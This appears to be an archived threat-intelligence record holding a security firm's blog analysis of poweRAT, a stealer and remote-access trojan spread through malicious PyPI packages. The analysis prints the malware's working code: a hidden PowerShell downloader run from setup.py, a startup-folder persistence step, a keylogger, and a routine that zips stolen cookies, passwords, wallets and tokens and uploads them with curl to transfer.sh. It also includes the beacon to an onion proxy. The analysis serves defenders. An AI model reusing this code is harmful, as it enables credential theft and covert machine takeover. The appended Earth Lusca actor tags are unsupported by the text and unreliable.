@@ -1,0 +1,145 @@
+{
+    "id": "f55e3209-20f3-466e-921f-ff2f9d5a25f4",
+    "created_at": "2023-03-03T02:06:39.471591Z",
+    "updated_at": "2025-03-27T02:15:35.549046Z",
+    "deleted_at": null,
+    "sha1_hash": "39ad39e03e2af5e8d19070f7a5ec7cd74adf163c",
+    "title": "2023-01-05 - A Deep Dive Into poweRAT- a Newly Discovered Stealer-RAT Combo Polluting PyPI",
+    "authors": "",
+    "file_creation_date": "2023-03-01T09:34:20Z",
+    "file_modification_date": "2023-03-01T09:34:20Z",
+    "file_size": 16515192,
+    "plain_text": "# A Deep Dive Into poweRAT: a Newly Discovered Stealer/RAT Combo Polluting PyPI\n\n**[blog.phylum.io/a-deep-dive-into-powerat-a-newly-discovered-stealer/rat-combo-polluting-pypi](https://blog.phylum.io/a-deep-dive-into-powerat-a-newly-discovered-stealer/rat-combo-polluting-pypi)**\n\nPhylum has uncovered yet another malware campaign waged against PyPI users. And once\nagain, the attack chain is complicated and obfuscated, but it’s also quite novel and further\nproof that supply chain attackers aren’t going to be giving up any time soon.\n\n## Background\n\nOn the morning of December 22, 2022 Phylum’s automated risk detection platform flagged a\npackage called pyrologin. At first glance, it looked like pretty standard Python malware\ncalling exec on a decoded Base64-encoded string so we reported it and moved on. One\nthing that did stick out in this package, however, was the fetching of a zip file from a\ntransfer[.]sh site and some strings that contained PowerShell code with 'SilentlyContinue'\nand -WindowStyle Hidden in it. This looked like a clear attempt to hide whatever code the\nattacker was trying to execute. But again, at the time this was the only package like it we\nfound so we pinned it to our “keep an eye on this” wall and moved on.\n\nBut then:\n\n12/28/22 our automated risk detection platform alerted us to the publication of\n```\n   easytimestamp which bore similar hallmarks to pyrologin\n\n```\n12/29/22 our platform flagged the publication of both discorder and discord-dev\nwhich also contained similarities to pyrologin\n\n\n-----\n\n12/31/22 our platform flagged the publication of style.py and pythonstyles, which\nagain, looked just like all the others\n\nAt this point it was obvious that this was not just a one-off publication, but another\nburgeoning attack on Python developers and PyPI. Let’s dig in!\n\n## The setup.py\n\nThe first stage of this attack chain, like a lot of the malware we’ve recently uncovered in\nPyPI, starts in the setup.py. This, unfortunately, means that anyone who simply pip\n```\ninstalls any of these packages triggers the start of malware deployment on their machine.\n\n```\nHere’s the relevant snippet from the setup.py formatted for readability:\n```\n...\n\nexec(base64.b64decode(b'ZGVmIHJ1bihjbWQpOmltcG9ydCBvcywgc3VicHJvY2Vzczty---TRUNCATED--'))\n\nif not os.path.exists(r'C:/ProgramData/Updater'):\n\n  print('Installing dependencies, please wait...')\n\nif sys.version_info.minor > 10:\n\n  run(r\"powershell -command $ProgressPreference = 'SilentlyContinue';\n$ErrorActionPreference = 'SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri\nhttps://transfer.sh/0tUIJu/Updater.zip -OutFile $env:tmp/update.zip; Expand-Archive Force -LiteralPath $env:tmp/update.zip -DestinationPath C:/ProgramData; Remove-Item\n$env:tmp/update.zip; Start-Process -WindowStyle Hidden -FilePath python.exe -Wait ArgumentList @('-m pip install pydirectinput pyscreenshot flask py-cpuinfo\npycryptodome GPUtil requests keyring pyaes pbkdf2 pywin32 pyperclip flask_cloudflared\npillow pynput'); WScript.exe //B C:\\ProgramData\\Updater\\launch.vbs powershell.exe WindowStyle hidden -command Start-Process -WindowStyle Hidden -FilePath python.exe\nC:\\ProgramData\\Updater\\server.pyw\")\n\nelse:\n\n  run(r\"powershell -command $ProgressPreference = 'SilentlyContinue';\n$ErrorActionPreference = 'SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri\nhttps://transfer.sh/0tUIJu/Updater.zip -OutFile $env:tmp/update.zip; Expand-Archive Force -LiteralPath $env:tmp/update.zip -DestinationPath C:/ProgramData; Remove-Item\n$env:tmp/update.zip; Start-Process -WindowStyle Hidden -FilePath python.exe -Wait ArgumentList @('-m pip install pydirectinput pyscreenshot flask py-cpuinfo\npycryptodome GPUtil requests keyring pyaes pbkdf2 pywin32 pyperclip flask_cloudflared\npillow pynput lz4'); WScript.exe //B C:\\ProgramData\\Updater\\launch.vbs powershell.exe\n-WindowStyle hidden -command Start-Process -WindowStyle Hidden -FilePath python.exe\nC:\\ProgramData\\Updater\\server.pyw\")\n\n...\n\n```\nThe first thing we notice is the exec of a Base64-encoded string, as mentioned above. Let’s\nfirst decode that and see what’s happening there. My formatting:\n\n\n-----\n\n```\ndef run(cmd):\n\n  import os, subprocess\n\n  result = subprocess.Popen(\n\n    cmd,\n\n    shell=True,\n\n    stdin=subprocess.PIPE,\n\n    stdout=subprocess.PIPE,\n\n    stderr=subprocess.STDOUT,\n\n    close_fds=True\n\n  )\n\n  output = result.stdout.read()\n\n  return\n\n```\nOk, so it just defines a function called run that will take the supplied cmd argument and pass\nit to subprocess.Popen() which will execute cmd in a new process. Note that shell=True is\nset which will use shell as the program to execute. The purpose of using exec on the\nencoded string appears to be an attempt to thwart static analysis and/or provide some\nminimal form of obfuscation.\n\nWith run now defined, we move on to a pointless check to see if C:/ProgramData/Updater\nexists. If it doesn’t (this directory is created in a later step), it simply tells the victim that\n“dependencies” are being installed.\n\nNext it checks what minor version of Python is running and then passes a long PowerShell\ncommand to our now-defined run function. The minor version check simply determines what\npackages need to be pip installed in this next step to support the final malware deployment.\nLet’s dissect the PowerShell code. Here it is formatted for readability:\n\n\n-----\n\n```\n$ProgressPreference SilentlyContinue ;\n\n$ErrorActionPreference = 'SilentlyContinue';\n\nInvoke-WebRequest\n\n     -UseBasicParsing\n\n     -Uri https://transfer.sh/0tUIJu/Updater.zip\n\n     -OutFile $env:tmp/update.zip;\n\nExpand-Archive\n\n     -Force\n\n     -LiteralPath $env:tmp/update.zip\n\n     -DestinationPath C:/ProgramData;\n\nRemove-Item $env:tmp/update.zip;\n\nStart-Process\n\n     -WindowStyle Hidden\n\n     -FilePath python.exe\n\n     -Wait\n\n     -ArgumentList @('-m pip install pydirectinput pyscreenshot flask py-cpuinfo\npycryptodome GPUtil requests keyring pyaes pbkdf2 pywin32 pyperclip flask_cloudflared\npillow pynput');\n\nWScript.exe //B C:\\ProgramData\\Updater\\launch.vbs\n\npowershell.exe\n\n     -WindowStyle hidden\n\n     -command Start-Process\n\n          -WindowStyle Hidden\n\n          -FilePath python.exe C:\\ProgramData\\Updater\\server.pyw\n\n```\nHere’s what’s happening:\n\n1. Right off the bat we can see some preferences set to 'SilentlyContinue', in other\n\nwords, don’t let the victim know what‘s going on.\n2. There’s an Invoke-WebRequest to grab a zip file from\n```\n   https://transfer.sh/0tUIJu/Updater.zip and drop it into a temp directory\n\n```\n3. It then unzips it to C:/ProgramData/Updater\n4. It removes the downloaded zip from disk.\n5. It then uses Start-Process to run python -m pip install and installs a long list of\n\npotentially invasive packages including pynput, pydirectinput, and pyscreenshot.\nAmong other things, these libraries allow one to control and monitor mouse and\nkeyboard input and capture screen contents. It’s also worth noting the installation of\n```\n   flask and flask_cloudflared, because this is were it gets really interesting—more on\n\n```\nthis later.\n6. And finally, it uses WScript.exe to run a vbs file from the unzipped directory called\n```\n   launch.vbs that launches powershell.exe to launch another downloaded file called\n   server.pyw in -WindowStyle Hidden mode.\n\n```\nWhew, lot going on here. Let’s start by exploring the contents on the zip it pulls. It contains\nthe following files and folders:\n```\n   cftunnel.py\n   cgrab py\n\n```\n\n-----\n\n```\n   discord.py\n   launch.vbs\n   pwgrab.py\n   server.pyw\n   static/\n   templates/\n\n```\nLet’s take a look at the files in the order in which they’re used.\n```\nlaunch.vbs\n\n```\nIn step 6 above, WScript.exe is used to run launch.vbs so let’s see what’s going on in\nthere:\n```\nOn Error Resume Next\n\nReDim args(WScript.Arguments.Count-1)\n\nFor i = 0 To WScript.Arguments.Count-1\n\n  If InStr(WScript.Arguments(i), \" \") > 0 Then\n\n    args(i) = Chr(34) & WScript.Arguments(i) & Chr(34)\n\n  Else\n\n    args(i) = WScript.Arguments(i)\n\n    End If\n\nNext\n\nCreateObject(\"WScript.Shell\").Run Join(args, \" \"), 0, False\n\n```\nThe sole purpose of using this script is to launch powershell.exe silently. There’s a\n[StackOverflow answer to a question about how to do this that we suspect the attacker just](https://stackoverflow.com/a/51007810/4181058)\ncompletely lifted this code from as it’s exactly the same.\n```\nserver.pyw\n\n```\nThe complicated launch sequence above ultimately runs server.pyw so let’s turn our\nattention there. Here’s what we find in that file:\n```\nimport lzma, base64\n\nexec(lzma.decompress(base64.b64decode('/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4D96FUNdADSbS--TRUNCATED---')))\n\n```\nYay, another exec, but this time it’s running something that’s been Base64-encoded and lzma\ncompressed. Ok, let’s decode and decompress! For brevity, I won’t paste the entire result\nhere because it turns out to be a 675 LOC file containing a fully-fledged flask app with 17\nroutes and over 30 helper functions! I’ll include just the imports and main entrypoint code\nhere. Comments and formatting are mine:\n\n\n-----\n\n```\nimport os\n\nfrom flask import Flask, request, send_file, render_template\n\nfrom io import BytesIO, StringIO\n\nimport subprocess, pyscreenshot, pydirectinput, GPUtil, requests, cpuinfo, shutil,\nstring, random, sys\n\nfrom cftunnel import run_with_cloudflared\n\nfrom threading import Thread\n\nimport pwgrab, discord, re, time, datetime\n\nfrom win32gui import GetForegroundWindow, GetWindowText\n\nfrom pynput import keyboard\n\n# browser storage mapping dict here\n\n# crypto wallet mapping dict here\n\n# chromium browser extension mapping dict here\n\n# large flask app here\n\nif __name__ == \"__main__\":\n\n  if os.path.exists(lap + r\"\\whitelist\"):\n\n    app.run(debug=True, threaded=True)\n\n    Thread(target=key).start()\n\n  else:\n\n    Thread(target=startup).start()\n\n    Thread(target=ping).start()\n\n    Thread(target=key).start()\n\n    Thread(target=stl).start()\n\n    run_with_cloudflared(app)\n\n    app.run(debug=True, threaded=True)\n\n```\nFirst, we see the use of some of those imports installed earlier. Then we see a check for a\nwhitelist file that’ll get us into debug mode if found. Since our concern lies with the victim let’s\nignore that path and look at the 4 Threads fired off before the flask app is even started:\n\n### Thread 1: Thread(target=startup).start()\n\nHere’s the code for the startup function:\n```\ndef startup():\n\n  try:\n\n    run(\n\n      r\"powershell -command $startup = $env:appdata +\n\\'\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\Updater.lnk\\'; $WshShell =\nNew-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut($startup);\n$Shortcut.TargetPath = \\'WScript.exe\\'; $Shortcut.Arguments = \\'//B\nC:\\\\ProgramData\\\\Updater\\\\launch.vbs powershell.exe -WindowStyle hidden -command\nStart-Process -WindowStyle Hidden -FilePath python.exe\nC:\\\\ProgramData\\\\Updater\\\\server.pyw\\'; $Shortcut.Save()\"\n\n    )\n\n    run(\"attrib +s +h C:/ProgramData/Updater\")\n\n  except:\n\n    pass\n\n```\n\n-----\n\nThe first thing this code does is try to establish persistence by putting itself into the Windows\nstartup folder with the benign sounding name Updater.\n\n### Thread 2: Thread(target=ping).start()\n\nIt fires off another thread to run ping:\n```\ndef ping():\n\n  while True:\n\n    try:\n\n      time.sleep(5)\n\n      localhost_url = \"http://127.0.0.1:8099/metrics\"\n\n      tunnel_url = requests.get(localhost_url).text\n\n      tunnel_url = re.search(\n\n        \"(?Phttps?:\\\\/\\\\/[^\\\\s]+.trycloudflare.com)\", tunnel_url\n\n      ).group(\"url\")\n\n      requests.get(\n\nf\"https://itduh2irtgjfx5gvmdxfkcetmgvmgyaqzayhruau4v57747funxuhoqd.onion.pet/ping?\ntunnel={tunnel_url}&uuid={uuid}&username={username}\",\n\n        verify=False,\n\n      )\n\n    except:\n\n      pass\n\n```\nWe’ll come back to this later, but for now we can see that it’ll indefinitely keep trying to get a\nresponse from localhost:8099/metrics and if successful sends a ping to a proxied onion\nsite.\n\n### Thread 3: Thread(target=key).start()\n\nThis one is simple, it just starts a keystroke logger:\n```\ndef key():\n\n  keyboardListener = keyboard.Listener(on_press=addKey)\n\n  keyboardListener.start()\n\n### Thread 4: Thread(target=stl).start()\n\n```\nThis one does a lot:\n\n\n-----\n\n```\ndef stl():\n\n  if not os.path.exists(lap + r\"\\firstrun.txt\"):\n\n    try:\n\n      savepath = tmp + \"\\\\saved\"\n\n      zip_file = tmp + f\"\\\\{uuid}.zip\"\n\n      try:\n\n        run(f'rmdir /q /s \"{savepath}\\\\')\n\n      except:\n\n        pass\n\n      if supported:\n\n        get_chrome_cookies()\n\n        get_chromium_cookies()\n\n        get_firefox_cookies()\n\n        get_edge_cookies()\n\n        get_brave_cookies()\n\n        get_opera_cookies()\n\n        get_operagx_cookies()\n\n        get_vivaldi_cookies()\n\n      for browser, browser_dir in browsers.items():\n\n        get_passwords(browser, browser_dir)\n\n      for extension, extension_dir in extensions.items():\n\n        get_extensions(extension, extension_dir)\n\n      for wallet, wallet_dir in wallets.items():\n\n        get_wallets(wallet, wallet_dir)\n\n      get_telegram()\n\n      get_tokens()\n\n      run(\n\n        r'rmdir /q /s \"'\n\n        + savepath\n\n        + r'\\\\misc\\\\tdata\\\\user_data\" && rmdir /q /s \"'\n\n        + savepath\n\n        + r'\\\\misc\\\\tdata\\\\emoji\\\\\"'\n\n      )\n\n      run(f'powershell Compress-Archive -Force \"{savepath}\\\\' \"{zip_file}\\\\\")\n\n      run(f'attrib +h \"{savepath}\"')\n\n      run(f'attrib +h \"{zip_file}\"')\n\n      link = (\n\n        \"https://transfer.sh/\"\n\n        + run(f\"curl -T \\\"{zip_file}\\\"\nhttps://transfer.sh/{uuid}.zip\").split(\n\n          \"https://transfer.sh/\"\n\n        )[1]\n\n      )\n\n      requests.get(\n\nf\"https://itduh2irtgjfx5gvmdxfkcetmgvmgyaqzayhruau4v57747funxuhoqd.onion.pet/save?\nuuid={uuid}&link={link}&date={date}&username={username}\",\n\n        verify=False,\n\n      )\n\n      run(f\"echo no >%localappdata%/firstrun.txt\")\n\n    except:\n\n      pass\n\n```\n\n-----\n\nI think the function names alone give you a pretty clear idea of what s happening there. The\ngist is that the attacker steals all the cookies, browser passwords, telegram data, discord\ntokens, and crypto wallets that it can, stuffs it all into a zip, and then exfiltrates it through\nanother transfer[.]sh site. Then the attacker sends another ping to an onion site through a\ndarknet to clearnet proxy with some info, presumably letting them know they successfully\nstole a bunch of stuff.\n```\nrun_with_cloudflared(app)\n\n```\nOk, so while the ping function is forever trying to get a hold of localhost:8099/metrics, the\nattacker then runs run_with_cloudflared()which is imported from the cftunnel.py file, so\nlet’s head over there.\n```\ncftunnel.py\n\n```\nThis is another rather lengthy file so I won’t paste its contents, but all we need to know is that\n[it attempts to download and install cloudflared, a cloudflare tunnel client on the victim’s](https://github.com/cloudflare/cloudflared)\nmachine. From the README:\n\n[cloudflared] contains the command-line client for Cloudflare Tunnel, a tunneling\ndaemon that proxies traffic from the Cloudflare network to your origins. This daemon\nsits between Cloudflare network and your origin (e.g. a webserver). Cloudflare attracts\nclient requests and sends them to you via this daemon, without requiring you to poke\nholes on your firewall --- your origin can remain as closed as possible.\n\nYikes.\n\nSo it looks like run_with_cloudflared() is allowing the attacker access to the flask app\nrunning on a victim’s machine through a Cloudflare Tunnel without having to open anything\non the firewall. This can all be done completely free of charge to the attacker by using\n[TryCloudflare, which appears to be what they’re using here. And once the tunnel is up and](https://try.cloudflare.com/)\nrunning, that ping function will finally succeed and let the attacker know the tunnel is\nfunctional and they have control of another machine.\n\nOk, so now we have a pretty good picture of what’s going on here. Let’s recap. By just\ninstalling one of these packages:\n\n1. A ton of sensitive information gets exfiltrated\n2. The attacker establishes persistence\n3. A keystroke logger is turned on\n4. A Cloudflare tunnel is installed\n5. A flask app is started that the attacker can access through the tunnel\n\n\n-----\n\nThis is definitely novel with respect to the malware we typically see published in PyPI. It s a\nstealer combined with a reverse access trojan (RAT).\n\n## But Wait! There’s more…\n\nLet’s now explore some of the flask app routes to see what this RAT is capable of.\n\n### The Flask App\n\nWe’ll start by looking at the “/” route. For those unfamiliar with flask or web app routing this\nis like the “home” page or index page of an app. This route is bound to a function called cnc\n—presumably standing for command and control.\n```\n@app.route(\"/\")\n\ndef cnc():\n\n  return render_template(\n\n    \"control.html\",\n\n    username=username,\n\n    ipv4=ipv4,\n\n    ipv6=ipv6,\n\n    gpu=gpu,\n\n    cpu=cpu,\n\n    ram=ram,\n\n  )\n\n```\nIt simply renders the control.html template and passes in some information about the victim\nmachine as variables. Here’s a screenshot of that template rendered without css and outside\nof flask:\n\n\n-----\n\nWe can still get a good sense of what it’s doing without running the app. Looks like we were\nright about it being a command and control center. It extracts the victim’s username, IPs, and\nmachine information and allows the attacker to run shell commands, download remote files\nand execute them on the machine, exfiltrate files and even entire directories from the\nmachine, and even execute arbitrary python code.\n\n\n-----\n\nIt calls itself xrat but as of publication of this post, we re unsure what this is a reference to.\nThere are strong similarities in terms of capabilities to other RATs published with the name\n“xrat” but they are not written in Python. Perhaps this is the start of a port of another xrat or\nmaybe even just a nod to one. Either way, we’re calling it poweRAT because of its early\nreliance on PowerShell in the attack chain.\n\nAside from the main functions shown above in the GUI, there’s a route called live bound to\n```\nserve_img with the following code:\n@app.route(\"/live\\\\\")\n\ndef serve_img():\n\n  return render_template(\"live.html\\\\\")\n\n```\nInteresting, let’s take a look at the live.html template that it renders here.\n\n\n-----\n\n```\n<html>\n\n<head>\n\n  <script type=\"text/javascript\">\n\n    function reloadpic() {\n\n      document.images[\"screen\"].src = \"screen.png?random=\" + new\nDate().getTime();\n\n      setTimeout(\"reloadpic();\", 1000);\n\n    }\n\n    onload = reloadpic;\n\n    function click(event) {\n\n      fetch(`/click?x=${event.pageX}&y=${event.pageY}`);\n\n    }\n\n    function type(event) {\n\n      fetch(`/type?key=${event.key}`);\n\n    }\n\n    document.addEventListener(\"click\", click);\n\n    document.addEventListener(\"keypress\", type);\n\n  </script>\n\n  <style>\n\n    body {\n\n      overflow: hidden;\n\n      padding: 0;\n\n      margin: 0;\n\n    }\n\n    img {\n\n      width: 100vw;\n\n    }\n\n  </style>\n\n</head>\n\n<body>\n\n  <img id=\"screen\">\n\n</body>\n\n</html>\n\n```\nOk, this is basically a rudimentary remote desktop implementation with about a 1fps refresh\nrate. The page is just a constantly updating image of the victim’s screen and you can see the\nJavaScript event listeners for mouse and keyboard clicks. So, the attacker is looking at\nconstantly updating screenshots of the victim’s machine and as they click or type on that\npage, these functions grab the x, y coordinates or buttons pressed by the attackers and pass\nit back to Python to then trigger the mouse click and button presses on the victim machine.\n\n## What’s the Takeaway?\n\n\n-----\n\nThis thing is like a RAT on steroids. It has all the basic RAT capabilities built into a nice web\nGUI with a rudimentary remote desktop capability and a stealer to boot! Even if the attacker\nfails to establish persistence or fails to get the remote desktop utility working, the stealer\nportion will still ship off whatever it found. And if the persistence and remote desktop parts do\nworks, well that’s just adding insult to injury. Like we’ve said before, these attackers are\npersistent and clever and will just keep changing tactics.\n\n**Footnotes**\n\nPackage Hashes\n\nBelow are the SHA256 hashes of the malicious packages.\n```\n5397800c26dc73bd3dfbd91aa88964244bc8d8dc9cc533fe25f9457d317354f9 pyrologin_2.7\n\n5904cf32df705d6e5c9ad730ee425382922e5bd13d1d67212342e374d57f71c3 style.py_3.1\n\nede874db1e28252914553871ff9528544894e1785e8b6cd093ebe586c8472997 pythonstyles_3.1\n\nd0a42a9a0897e762da6b2d3796d03934dc8c2f6d7d2308dc65231497399df145 discord-dev_3.0\n\n96a2b383be58f0896d50ca93e23009729f1decfa84b6a837190dd6795227b6c6 easytimestamp_2.8\n\neeef39f59c56eca1198a05f272fa27da0ba745657a59c07c13939120513495ba discorder_2.8\n\n```\n\n-----\n\n### The Phylum Research Team\n\nThe Phylum Research Team is made up of proven, seasoned security researchers, data\nscientists and software engineers. The team’s collective experience spans across\ngovernment and the private sector, with team members making impactful contributions to\nstartups, the intelligence community, federal policy and agencies like the Department of\nDefense.\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-01-05 - A Deep Dive Into poweRAT- a Newly Discovered Stealer-RAT Combo Polluting PyPI.pdf"
+    ],
+    "report_names": [
+        "2023-01-05 - A Deep Dive Into poweRAT- a Newly Discovered Stealer-RAT Combo Polluting PyPI.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
+            "created_at": "2023-01-06T13:46:39.396409Z",
+            "updated_at": "2025-03-27T02:00:03.074969Z",
+            "deleted_at": null,
+            "main_name": "Earth Lusca",
+            "aliases": [
+                "CHROMIUM",
+                "ControlX",
+                "Red Dev 10",
+                "RedHotel",
+                "Red Scylla",
+                "TAG-22",
+                "BRONZE UNIVERSITY",
+                "AQUATIC PANDA",
+                "Charcoal Typhoon",
+                "BountyGlad"
+            ],
+            "source_name": "MISPGALAXY:Earth Lusca",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
+            "created_at": "2022-10-25T16:07:23.565337Z",
+            "updated_at": "2025-03-27T02:02:09.868522Z",
+            "deleted_at": null,
+            "main_name": "Earth Lusca",
+            "aliases": [
+                "Bronze University",
+                "Charcoal Typhoon",
+                "Chromium",
+                "Red Dev 10",
+                "Red Scylla"
+            ],
+            "source_name": "ETDA:Earth Lusca",
+            "tools": [
+                "Agentemis",
+                "AntSword",
+                "BIOPASS",
+                "BIOPASS RAT",
+                "BadPotato",
+                "Behinder",
+                "BleDoor",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "Doraemon",
+                "FRP",
+                "Fast Reverse Proxy",
+                "FunnySwitch",
+                "HUC Port Banner Scanner",
+                "KTLVdoor",
+                "Mimikatz",
+                "NBTscan",
+                "POISONPLUG.SHADOW",
+                "PipeMon",
+                "RbDoor",
+                "RibDoor",
+                "RouterGod",
+                "SAMRID",
+                "ShadowPad Winnti",
+                "SprySOCKS",
+                "WinRAR",
+                "Winnti",
+                "XShellGhost",
+                "cobeacon",
+                "fscan",
+                "lcx",
+                "nbtscan"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
+            "created_at": "2022-10-27T08:27:13.212301Z",
+            "updated_at": "2025-03-27T02:00:55.529662Z",
+            "deleted_at": null,
+            "main_name": "Earth Lusca",
+            "aliases": [
+                "Earth Lusca",
+                "TAG-22",
+                "Charcoal Typhoon",
+                "CHROMIUM",
+                "ControlX"
+            ],
+            "source_name": "MITRE:Earth Lusca",
+            "tools": [
+                "Mimikatz",
+                "PowerSploit",
+                "Tasklist",
+                "certutil",
+                "Cobalt Strike",
+                "Winnti for Linux",
+                "Nltest",
+                "NBTscan",
+                "ShadowPad"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1677809199,
+    "ts_updated_at": 1743041735,
+    "ts_creation_date": 1677663260,
+    "ts_modification_date": 1677663260,
+    "files": {
+        "pdf": "https://archive.orkl.eu/39ad39e03e2af5e8d19070f7a5ec7cd74adf163c.pdf",
+        "text": "https://archive.orkl.eu/39ad39e03e2af5e8d19070f7a5ec7cd74adf163c.txt",
+        "img": "https://archive.orkl.eu/39ad39e03e2af5e8d19070f7a5ec7cd74adf163c.jpg"
+    }
+}
